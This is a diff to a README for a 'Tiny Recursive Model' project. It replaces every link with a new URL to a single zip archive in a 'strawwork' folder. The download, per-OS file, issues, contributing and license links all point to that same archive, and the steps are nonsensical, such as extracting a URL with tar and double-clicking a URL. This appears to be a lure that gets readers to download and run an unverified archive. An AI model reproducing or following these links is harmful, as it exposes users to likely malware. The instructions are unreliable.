@@ -6,7 +6,7 @@ Welcome to the **Tiny Recursive Model** project! This software provides an easy 
 
 ## 📥 Download Now
 
-[![Download tiny-recursive-model](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)
+[![Download tiny-recursive-model](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip)](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip)
 
 ## 🛠️ Requirements
 
@@ -20,13 +20,13 @@ Before you start, ensure your computer meets the following basic requirements:
 
 1. **Visit the Releases Page**  
    To download the latest version of the Tiny Recursive Model, click the link below:  
-   [Download the latest release](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)
+   [Download the latest release](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip)
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the one that matches your operating system:
-   - **Windows:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
-   - **macOS:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
-   - **Linux:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
+   - **Windows:** `https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip`
+   - **macOS:** `https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip`
+   - **Linux:** `https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip`
 
 3. **Download the File**  
    Click on the appropriate file to start the download. The file will save to your computer.
@@ -36,13 +36,13 @@ Before you start, ensure your computer meets the following basic requirements:
    - For Windows and macOS, right-click the file and choose "Extract All" or "Open with" -> "Archive Utility."  
    - For Linux, use the terminal to extract the file:  
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip
+   tar -xvzf https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip
    ```
 
 5. **Run the Application**  
    Navigate to the folder where you extracted the files.  
-   - **Windows:** Double-click `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`.  
-   - **macOS:** Open the `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip` file.  
+   - **Windows:** Double-click `https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip`.  
+   - **macOS:** Open the `https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip` file.  
    - **Linux:** Open the terminal, navigate to the folder, and type:  
    ```bash
    ./tiny-recursive-model
@@ -75,15 +75,15 @@ Once you run the application, follow these simple steps:
 
 ## 💬 Support
 
-If you encounter any issues or need assistance, please visit the project's [issues page](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip). You can report bugs, request features, or ask general questions. 
+If you encounter any issues or need assistance, please visit the project's [issues page](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip). You can report bugs, request features, or ask general questions. 
 
 ## 🤝 Contributing
 
-We welcome contributions! If you want to help enhance this project, please check out our [contributing guidelines](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip) for more information.
+We welcome contributions! If you want to help enhance this project, please check out our [contributing guidelines](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip) for more information.
 
 ## 📜 License
 
-This project is licensed under the MIT License. For more details, see the [LICENSE](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip) file.
+This project is licensed under the MIT License. For more details, see the [LICENSE](https://github.com/Jagatmohan46/tiny-recursive-model/raw/refs/heads/main/strawwork/model-recursive-tiny-2.0-alpha.5.zip) file.
 
 ## 🌟 Acknowledgments
 
